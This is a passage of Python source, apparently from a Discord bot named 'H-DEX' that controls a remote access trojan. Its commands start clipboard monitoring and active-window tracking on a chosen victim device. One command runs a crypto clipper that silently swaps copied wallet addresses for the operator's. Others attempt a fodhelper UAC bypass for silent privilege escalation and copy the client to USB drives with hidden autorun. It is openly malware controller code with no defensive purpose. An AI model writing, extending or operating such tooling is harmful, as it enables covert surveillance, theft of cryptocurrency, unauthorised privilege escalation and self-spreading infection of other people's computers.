async def cmd_clipmon(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "start_clipboard_monitor", "target_id": device_id})
    embed = create_embed("📋 Clipboard Monitor", "Real-time clipboard monitoring **STARTED**.\nAll clipboard changes will be streamed.", color=Colors.SUCCESS)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="stopclipmon", description="Stop clipboard monitoring on selected device")
async def cmd_stopclipmon(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "stop_clipboard_monitor", "target_id": device_id})
    embed = create_embed("📋 Clipboard Monitor", "Clipboard monitoring **STOPPED**.", color=Colors.MUTED)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="windowtrack", description="Start tracking active windows on selected device")
async def cmd_windowtrack(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "start_window_tracker", "target_id": device_id})
    embed = create_embed("🪟 Window Tracker", "Tracking active windows **STARTED**.\nEvery app/website change will be logged.", color=Colors.SUCCESS)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="stopwindowtrack", description="Stop tracking active windows on selected device")
async def cmd_stopwindowtrack(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "stop_window_tracker", "target_id": device_id})
    embed = create_embed("🪟 Window Tracker", "Window tracking **STOPPED**.", color=Colors.MUTED)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="windowlog", description="Get window activity log from selected device")
async def cmd_windowlog(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "get_window_log", "target_id": device_id})
    embed = create_embed("🪟 Window Log", "Fetching window activity log...", color=Colors.INFO)
    await interaction.response.send_message(embed=embed, ephemeral=True)


# ═══════════════════════════════════════════════════════════════════════════════
# NEW v3.1 COMMANDS — CRYPTO CLIPPER
# ═══════════════════════════════════════════════════════════════════════════════

@bot.tree.command(name="cryptoclip", description="Start crypto address clipper on selected device")
@app_commands.describe(
    btc="Your BTC wallet address (optional)",
    eth="Your ETH wallet address (optional)",
    ltc="Your LTC wallet address (optional)",
    xmr="Your XMR wallet address (optional)"
)
async def cmd_cryptoclip(interaction: discord.Interaction, btc: str = "", eth: str = "", ltc: str = "", xmr: str = ""):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    
    wallets = {}
    if btc: wallets["btc"] = btc
    if eth: wallets["eth"] = eth
    if ltc: wallets["ltc"] = ltc
    if xmr: wallets["xmr"] = xmr
    
    if not wallets:
        await interaction.response.send_message("❌ You must provide at least one wallet address!", ephemeral=True)
        return
    
    await send_to_server({"type": "start_crypto_clipper", "target_id": device_id, "wallets": wallets})
    
    coins = ", ".join([k.upper() for k in wallets.keys()])
    embed = create_embed("💰 Crypto Clipper", f"Clipper **ACTIVATED** for: **{coins}**\nClipboard addresses will be silently swapped.", color=0xF7931A)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="stopcryptoclip", description="Stop crypto clipper on selected device")
async def cmd_stopcryptoclip(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "stop_crypto_clipper", "target_id": device_id})
    embed = create_embed("💰 Crypto Clipper", "Clipper **DEACTIVATED**.", color=Colors.MUTED)
    await interaction.response.send_message(embed=embed)


# ═══════════════════════════════════════════════════════════════════════════════
# NEW v3.1 COMMANDS — ADVANCED EXPLOITS
# ═══════════════════════════════════════════════════════════════════════════════

@bot.tree.command(name="uacbypass", description="Attempt UAC bypass via fodhelper on selected device")
async def cmd_uacbypass(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "uac_bypass", "target_id": device_id})
    embed = create_embed("🔓 UAC Bypass", "Attempting silent privilege escalation via **fodhelper**...\nAn elevated instance will launch.", color=Colors.WARNING)
    await interaction.response.send_message(embed=embed)


@bot.tree.command(name="spreadusb", description="Spread client to all connected USB drives")
async def cmd_spreadusb(interaction: discord.Interaction):
    device_id = bot.selected_device.get(interaction.user.id)
    if not device_id or not bot.connected:
        await interaction.response.send_message("❌ No device selected! Use `/dex set <id>` first.", ephemeral=True)
        return
    await send_to_server({"type": "spread_usb", "target_id": device_id})
    embed = create_embed("💾 USB Spreader", "Copying client to all removable USB drives with hidden autorun...", color=Colors.DANGER)
    await interaction.response.send_message(embed=embed)


# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    token = config.get('discord_token', '')
    
    if not token or token == "YOUR_BOT_TOKEN_HERE":
        logger.error("❌ Discord bot token not configured!")
        logger.error("   Edit config.json and add your bot token.")
        print("\n" + "="*60)
        print("  H-DEX DISCORD BOT - SETUP REQUIRED")
        print("="*60)
        print("\n  1. Go to https://discord.com/developers/applications")
        print("  2. Create a new application")
        print("  3. Go to 'Bot' section and create a bot")
        print("  4. Copy the token")
        print("  5. Paste it in config.json")
        print("\n" + "="*60)
    else:
        logger.info("🚀 Starting H-DEX Discord Bot...")
        try:
            bot.run(token)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                logger.error("🛑 DISCORD RATE LIMIT (429) DETECTED!")
                logger.error("   Your IP is temporarily blocked by Discord.")
                logger.error("   Waiting 2 minutes before exiting to allow cooldown...")
                time.sleep(120) 
            else:
                logger.error(f"❌ Discord Exception: {e}")
        except Exception as e:
            logger.error(f"❌ Fatal Bot Error: {e}")
            time.sleep(10)
